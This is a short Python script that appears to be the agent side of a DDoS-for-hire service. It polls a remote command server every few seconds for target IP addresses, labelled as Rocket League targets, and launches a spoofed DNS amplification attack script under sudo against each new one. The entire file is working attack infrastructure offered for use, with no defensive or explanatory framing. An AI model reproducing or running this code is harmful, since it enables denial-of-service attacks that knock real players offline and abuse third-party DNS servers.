import time
import requests
import subprocess

# === CONFIGURATION ===
BACKEND_URL = "https://keyauthddos-e093a0d5e730.herokuapp.com"
CHECK_INTERVAL = 3  # seconds
active_targets = set()

# === POLLING LOOP ===
print("[*] VPS Agent Online. Polling for new Rocket League targets...")
while True:
    try:
        res = requests.get(f"{BACKEND_URL}/dispatch_multi").json()
        if isinstance(res, list):
            for task in res:
                ip = task.get("ip")
                if ip and ip not in active_targets:
                    print(f"[+] Launching attack on: {ip}")
                    subprocess.Popen(["sudo", "python3", "dns_amp_spoof.py", ip])
                    active_targets.add(ip)
        else:
            print("[~] No valid task list from dispatch.")
    except Exception as e:
        print(f"[!] Error: {e}")
    time.sleep(CHECK_INTERVAL)
